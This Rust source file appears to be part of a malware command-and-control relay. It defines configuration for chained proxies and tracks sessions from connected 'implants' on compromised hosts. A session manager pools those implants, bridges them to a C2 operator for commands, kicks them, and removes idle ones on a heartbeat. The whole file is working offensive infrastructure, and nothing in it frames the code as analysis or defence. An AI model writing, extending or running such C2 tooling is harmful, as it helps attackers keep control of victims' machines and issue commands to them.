#![allow(unused)]

use std::sync::{
    Arc, Mutex as StdMutex,
    atomic::{AtomicU32, Ordering},
};
use std::time::Instant;

use dashmap::DashMap;
use tokio::io::AsyncReadExt;
use tokio::net::{
    TcpStream,
    tcp::{OwnedReadHalf, OwnedWriteHalf},
};
use tokio::sync::{Mutex as AsyncMutex, mpsc};
use tokio::time::{Duration, interval};
use tokio_util::sync::CancellationToken;
use tracing::{debug, info, warn};

// data from implant buffers here when no C2 is reading
const CHAN_CAP: usize = 64;

// ── config ────────────────────────────────────────────────────────────────────

#[derive(Clone, Debug)]
pub struct ServerConfig {
    pub listening_addr: String,
    pub conn_timeout: Duration,
    pub next_hop_addr: String,
    pub is_last_proxy: bool,
}

impl ServerConfig {
    pub fn new<T: Into<String>>(
        listening_addr: T,
        conn_timeout: Duration,
        next_hop_addr: T,
        is_last_proxy: bool,
    ) -> Self {
        Self {
            listening_addr: listening_addr.into(),
            conn_timeout,
            next_hop_addr: next_hop_addr.into(),
            is_last_proxy,
        }
    }
}

// ── session ───────────────────────────────────────────────────────────────────

#[derive(Clone, Debug)]
pub struct ImplantSession {
    pub id: u32,
    pub connected_at: Instant,
    /// Send commands TO the implant
    pub writer: Arc<AsyncMutex<OwnedWriteHalf>>,
    /// Data coming FROM the implant — C2 reads this
    pub from_implant: Arc<AsyncMutex<mpsc::Receiver<Vec<u8>>>>,
    /// Fires instantly when implant disconnects or is kicked
    pub cancel: CancellationToken,
    last_seen: Arc<StdMutex<Instant>>,
}

impl ImplantSession {
    pub fn new(id: u32, stream: TcpStream) -> Self {
        let (reader, writer) = stream.into_split();
        let cancel = CancellationToken::new();
        let (tx, rx) = mpsc::channel(CHAN_CAP);
        let now = Instant::now();
        let last_seen = Arc::new(StdMutex::new(now));

        let session = Self {
            id,
            connected_at: now,
            writer: Arc::new(AsyncMutex::new(writer)),
            from_implant: Arc::new(AsyncMutex::new(rx)),
            cancel: cancel.clone(),
            last_seen: last_seen.clone(),
        };

        tokio::spawn(async move {
            Self::reader_task(id, reader, last_seen, cancel, tx).await;
        });

        session
    }

    /// Owns the read half — blocks on read(), zero polling, instant disconnect.
    /// Forwards received bytes into the channel for C2 to consume.
    async fn reader_task(
        id: u32,
        mut reader: OwnedReadHalf,
        last_seen: Arc<StdMutex<Instant>>,
        cancel: CancellationToken,
        tx: mpsc::Sender<Vec<u8>>,
    ) {
        let mut buf = [0u8; 4096];

        loop {
            match reader.read(&mut buf).await {
                Ok(0) => {
                    warn!("implant #{id} disconnected (EOF)");
                    cancel.cancel();
                    return;
                }
                Ok(n) => {
                    *last_seen.lock().unwrap() = Instant::now();
                    debug!("implant #{id} → {n} bytes");
                    // if channel full, drop — implants respond to commands, not unsolicited
                    tx.try_send(buf[..n].to_vec()).ok();
                }
                Err(e) => {
                    warn!("implant #{id} TCP error ({e})");
                    cancel.cancel();
                    return;
                }
            }
        }
    }

    pub fn touch(&self) {
        *self.last_seen.lock().unwrap() = Instant::now();
    }

    pub fn idle_for(&self) -> Duration {
        self.last_seen.lock().unwrap().elapsed()
    }
}

// ── session manager ───────────────────────────────────────────────────────────

#[derive(Clone)]
pub struct SessionManager {
    pub sessions: Arc<DashMap<u32, ImplantSession>>,
    counter: Arc<AtomicU32>,
}

impl SessionManager {
    pub fn new() -> Self {
        Self {
            sessions: Arc::new(DashMap::new()),
            counter: Arc::new(AtomicU32::new(0)),
        }
    }

    pub fn next_id(&self) -> u32 {
        self.counter.fetch_add(1, Ordering::Relaxed)
    }

    /// Insert and wire instant disconnect detection.
    pub fn insert(&self, session: ImplantSession) {
        let id = session.id;
        let sessions = self.sessions.clone();
        let cancel = session.cancel.clone();

        info!(
            "implant #{id} joined pool ({} total)",
            self.sessions.len() + 1
        );
        self.sessions.insert(id, session);

        // zero CPU — sleeps until cancel fires then cleans up instantly
        tokio::spawn(async move {
            cancel.cancelled().await;
            if sessions.remove(&id).is_some() {
                warn!("implant #{id} removed from pool (disconnected)");
            }
        });
    }

    /// Remove for bridging — caller gets full ownership.
    pub fn take(&self, id: u32) -> Option<ImplantSession> {
        let (_, session) = self.sessions.remove(&id)?;
        info!("implant #{id} taken from pool for bridging");
        Some(session)
    }

    /// Return to pool after bridging finishes.
    pub fn give_back(&self, session: ImplantSession) {
        info!("implant #{} returned to pool", session.id);
        session.touch();
        self.sessions.insert(session.id, session);
    }

    /// Force disconnect — usable from C2 side.
    pub fn kick(&self, id: u32) {
        if let Some(session) = self.sessions.get(&id) {
            warn!("implant #{id} kicked");
            session.cancel.cancel(); // watcher removes from pool
        }
    }

    pub fn count(&self) -> usize {
        self.sessions.len()
    }

    pub fn list_ids(&self) -> Vec<u32> {
        self.sessions.iter().map(|e| *e.key()).collect()
    }

    // ── heartbeat ─────────────────────────────────────────────────────────────
    // Only handles idle timeout now.
    // TCP liveness is instant via reader_task + cancel token — no probing needed.

    pub async fn run_heartbeat(
        &self,
        sweep_interval: Duration,
        idle_timeout: Duration,
        is_last_proxy: bool,
    ) {
        let mut ticker = interval(sweep_interval);

        loop {
            ticker.tick().await;
            if is_last_proxy {
                info!("heartbeat sweep — {} implants in pool", self.count());
            }

            for id in self.list_ids() {
                let session = match self.sessions.get(&id) {
                    Some(e) => e.clone(),
                    None => continue,
                };

                if session.idle_for() > idle_timeout {
                    warn!("implant #{id} idle too long — kicking");
                    self.kick(id);
                }
            }
        }
    }
}
